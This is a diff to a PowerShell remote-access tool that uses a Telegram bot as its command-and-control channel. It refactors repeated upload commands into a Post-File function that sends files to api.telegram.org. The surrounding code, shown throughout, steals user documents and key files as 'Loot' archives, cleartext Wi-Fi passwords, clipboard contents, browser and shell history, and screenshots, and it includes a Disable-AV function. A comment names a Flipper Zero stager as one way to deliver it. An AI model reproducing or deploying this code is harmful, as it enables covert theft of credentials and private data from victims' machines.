@@ -12,8 +12,7 @@ SEE README FOR MORE INFO
 
 #>
 #---------------------------------------------- SCRIPT SETUP -----------------------------------------------
-$Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
-#-----------------------------------------------------------------------------------------------------------
+$Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 
 # Define Connection Variables
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
@@ -45,6 +44,7 @@ $tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
 $scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $Mts = New-Object psobject 
 $Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+
 Function Post-Message{
     $script:params = @{chat_id = $ChatID ;text = $contents}
     Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
@@ -53,7 +53,7 @@ Function Post-Message{
 # Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 Post-Message
-#---------------------------------------------------------- COMMAND FUNCTIONS ---------------------------------------------------------
+#----------------------------------------------- COMMANDS / FUNCTIONS ----------------------------------------------
 
 Function Options{
 $contents = "==============================================
@@ -135,16 +135,14 @@ param ([string[]]$Path)
 if (Test-Path -Path $path){
     $extension = [System.IO.Path]::GetExtension($path)
     if ($extension -eq ".exe" -or $extension -eq ".msi") {
-        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
+        $FilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
         Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
-        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $FilePath)
+        Post-File; Rm -Path $FilePath -Recurse -Force
         Write-Output "File Upload Complete: $path"
-        Rm -Path $tempZipFilePath -Recurse -Force
     }else{
-        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+        Post-File; Rm -Path $FilePath -Recurse -Force
         Write-Output "File Upload Complete: $path"
-        Rm -Path $tempZipFilePath -Recurse -Force
     }
 }else{Write-Host "File Not Found: $path"}
 }
@@ -154,7 +152,7 @@ param ([string[]]$FileType,[string[]]$Path)
 $maxZipFileSize = 50MB
 $currentZipSize = 0
 $index = 1
-$zipFilePath ="$env:temp/Loot$index.zip"
+$FilePath ="$env:temp/Loot$index.zip"
 $contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
 Post-Message | Out-Null
 If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
@@ -162,7 +160,7 @@ else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop
 If($FileType -ne $null){$fileExtensions = "*."+$FileType}
 else {$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.docx", "*.rft")}
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+$zipArchive = [System.IO.Compression.ZipFile]::Open($FilePath, 'Create')
 $escmsg = "Files from : "+$env:COMPUTERNAME
 foreach ($folder in $foldersToSearch) {
     foreach ($extension in $fileExtensions) {
@@ -172,12 +170,11 @@ foreach ($folder in $foldersToSearch) {
             if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                 $zipArchive.Dispose()
                 $currentZipSize = 0
-                curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
-                Remove-Item -Path $zipFilePath -Force
+                Post-File; rm -Path $FilePath -Force
                 Sleep 1
                 $index++
-                $zipFilePath ="$env:temp/Loot$index.zip"
-                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+                $FilePath ="$env:temp/Loot$index.zip"
+                $zipArchive = [System.IO.Compression.ZipFile]::Open($FilePath, 'Create')
                 $messages=ReceiveMSG
                     if ($messages.message.text -contains "kill") {
                     $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
@@ -192,8 +189,7 @@ foreach ($folder in $foldersToSearch) {
         }
     }
 $zipArchive.Dispose()
-curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"  | Out-Null
-rm -Path $zipFilePath -Force
+Post-File ;rm -Path $FilePath -Force
 $contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
 Post-Message | Out-Null
 }
@@ -208,8 +204,7 @@ $filePath = "$env:temp\sc.png"
 $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 $graphics.Dispose()
 $bitmap.Dispose()
-curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Remove-Item -Path $filePath
+Post-File; rm -Path $filePath -Force
 }
 
 Function Key-Capture {
@@ -288,36 +283,35 @@ $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageLis
 $outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
 if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
-$outpath = "$env:temp\SystemInfo.txt"
-"USER INFO `n =========================================================================`n" | Out-File -FilePath $outpath -Encoding ASCII
-"$fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Keyboard Layout    : $keyboardLayoutID`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"NETWORK INFO `n ======================================================================`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Public IP          : $computerPubIP`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"vvv  Saved Networks  vvv `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerIP| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HARDWARE INFO `n ======================================================================`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"BIOS Info          : $computerBIOS`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"vvv  RAM Info  vvv `nTotal RAM : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Remove-Item -Path $outpath -Force
+$FilePath = "$env:temp\SystemInfo.txt"
+"USER INFO `n =========================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII
+"$fullName" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Email Address      : $email" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Language           : $systemLanguage" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Keyboard Layout    : $keyboardLayoutID`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($computerOs| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"NETWORK INFO `n ======================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Public IP          : $computerPubIP`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"vvv  Saved Networks  vvv `n$outssid" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($computerIP| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($network| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"HARDWARE INFO `n ======================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"BIOS Info          : $computerBIOS`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"vvv  RAM Info  vvv `nTotal RAM : $computerRamCapacity" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($computerRam| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($computerCpu| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($videocard| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($Hdds| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($COMDevices| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+Post-File ;rm -Path $FilePath -Force
 }
 
 Function Software-Info{
@@ -325,16 +319,15 @@ $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePat
 $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
 $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
 $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
-$outpath = "$env:temp\SoftwareInfo.txt"
-"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Remove-Item -Path $outpath -Force
+$FilePath = "$env:temp\SoftwareInfo.txt"
+"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($software| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($process| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($service| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+Post-File ;rm -Path $FilePath -Force
 }
 
 Function History-Info{
@@ -345,17 +338,16 @@ $Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:U
 $Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
 $Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
 $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
-$outpath = "$env:temp\History.txt"
-"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-(Get-Clipboard | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Remove-Item -Path $outpath -Force
+$FilePath = "$env:temp\History.txt"
+"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+(Get-Clipboard | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($Value| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($Value2| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($pshistory| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+Post-File ;rm -Path $FilePath -Force
 }
 
 Function Enumerate-LAN{
@@ -401,11 +393,10 @@ tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
 tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
 tree $env:APPDATA /A /F | Out-File $env:temp/Appdata.txt
 tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
-$zipFilePath ="$env:temp/TreesOfKnowledge.zip"
-Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $zipFilePath
+$FilePath ="$env:temp/TreesOfKnowledge.zip"
+Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $FilePath
 sleep 1
-curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-rm -Path $zipFilePath -Force
+Post-File ;rm -Path $FilePath -Force
 Write-Output "Done."
 }
 
@@ -490,6 +481,7 @@ Function Message([string]$Message){
     msg.exe * $Message
     Write-Output "Done."
 }
+
 # ---------------------------------------- ADMIN ONLY FUNCTIONS --------------------------------------------------
 
 Function Disable-AV{
@@ -514,6 +506,7 @@ Function Enable-HID{
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
     $PNPKeyboard.Enable()
 }
+
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
 Function ShowButtons{
@@ -540,6 +533,10 @@ while ($killint -eq 0) {
 }
 $contents = "$comp $env:COMPUTERNAME $tick Session Started"
 Post-Message
+}
+
+Function Post-File{
+    curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 }
 
 Function IsAuth{ 
@@ -582,6 +579,7 @@ try{
     }
 Catch{return "Telegram C2 Failed"}
 }
+
 #-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------
 
 While ($true){
